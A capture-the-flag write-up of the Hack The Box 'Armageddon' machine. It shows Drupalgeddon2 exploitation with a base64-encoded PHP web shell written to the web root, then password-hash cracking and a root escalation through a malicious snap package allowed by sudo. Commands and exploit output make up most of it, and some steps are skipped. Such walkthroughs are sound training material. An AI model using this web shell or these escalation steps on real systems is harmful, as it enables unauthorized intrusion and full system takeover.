---
tags:
  - hack
  - linux
---
# HTB: [Armageddon](https://app.hackthebox.com/machines/Armageddon)

> [!tip]- Summary with Spoilers
> - This machine was running Drupal 7.56 with the `Drupalgeddon` vulnerability, which I used to gain RCE as the `apache` user.
> - I cracked the admin’s password hash from the `settings.php` file to access the CMS.
> - I escalated privileges by exploiting a `sudo` misconfiguration that allowed me to run arbitrary Snap packages as `root`.

## Enumerate

```console
$ nmap -n -sCV -T4 -F $t
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 15:27 CST
Nmap scan report for 10.10.10.233
Host is up (0.22s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds
```

```console
$ curl -kI http://10.10.10.233
HTTP/1.1 200 OK
Date: Wed, 11 Oct 2023 21:35:25 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal 7 (http://drupal.org)
Content-Type: text/html; charset=utf-8
```

![](_/htb-armageddon-20231113-1.png)

This site is running [a vulnerable version of Drupal](https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql).

## Exploit

The vulnerability is a well-known one, called "Drupalgeddon". There are several PoC's available. I pick one from GitHub:

```console
$ wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/drupalgeddon2.rb
--2023-11-13 10:18:52--  https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/drupalgeddon2.rb
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22954 (22K) [text/plain]
Saving to: ‘drupalgeddon2.rb’

drupalgeddon2.rb                    100%[==================================================================>]  22.42K  --.-KB/s    in 0.02s   

2023-11-13 10:18:52 (946 KB/s) - ‘drupalgeddon2.rb’ saved [22954/22954]

$ sudo gem install highline
Fetching highline-2.1.0.gem
Successfully installed highline-2.1.0
Parsing documentation for highline-2.1.0
Installing ri documentation for highline-2.1.0
Done installing documentation for highline after 1 seconds
1 gem installed

$ sudo ./drupalgeddon2.rb http://$t
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo KFAVKEUM
[+] Result : KFAVKEUM
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

armageddon.htb>> ls -la /var/www/html/sites/default
total 56
dr-xr-xr-x. 3 apache apache    67 Dec  3  2020 .
drwxr-xr-x. 4 apache apache    75 Jun 21  2017 ..
-rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php
drwxrwxr-x. 3 apache apache    37 Dec  3  2020 files
-r--r--r--. 1 apache apache 26565 Dec  3  2020 settings.php

armageddon.htb>> diff /var/www/html/sites/default/{default.,}settings.php
247c247,261
< $databases = array();
> $drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';
```

## Escalate

I run `john` on the hash discovered above, and it's easy to crack:

```console
$ john --wordlist=rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)     
1g 0:00:00:00 DONE (2023-10-13 15:20) 4.000g/s 960.0p/s 960.0c/s 960.0C/s alyssa..chris
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I now login as `bruce` with the password I cracked:

```console
$ ssh brucetherealadmin@$t
brucetherealadmin@10.10.10.233's password: [booboo]
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ cat user.txt
19ace2[...]
```

# Escalate

I check what `sudo` privileges the user has:

```console
$ ssh brucetherealadmin@$t
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ cat user.txt
19ace2cb4e15efcf7d582a4b11c14fb1
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries forlbrucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

[snap](https://en.wikipedia.org/wiki/Snap_(software)) is a packaging system. I'm able to escalate privileges using a custom malicious package I create on my machine:

```console
$ scp xxxx_1.0_all.snap brucetherealadmin@${t}:/tmp/^C
^ rc=130

$ sudo sh snap_generator.sh 
Enter payload: 
cat /root/root.txt
-e Payload is set to: cat /root/root.txt 

Enter payload name: 
xxxx
-e 

-e ...Generating Payload...

Created package {:path=>"xxxx_1.0_all.snap"}

$ !scp

$ scp xxxx_1.0_all.snap brucetherealadmin@${t}:/tmp/
brucetherealadmin@10.10.10.233's password: 
xxxx_1.0_all.snap                                                                                                                                                  100% 4096    17.3KB/s   00:00    
```

This gives me root privileges on the target to access the `root.txt` flag:

```console
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install --dangerous --devmode /tmp/xxxx_1.0_all.snap 
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": /snap/xxxx/x1/meta/hooks/install: 2: /snap/xxxx/x1/meta/hooks/install: python: not found)
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install --dangerous --devmode /tmp/xxxx_1.0_all.snap 
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": 11fc9c[...])
```

## Summary

This machine is a simple example of a web site running vulnerable software that allows unauthenticated RCE, after which admin credentials are easily found on the filesystem that provide access to an admin user account with `sudo` privileges that are exploitable for full system access.
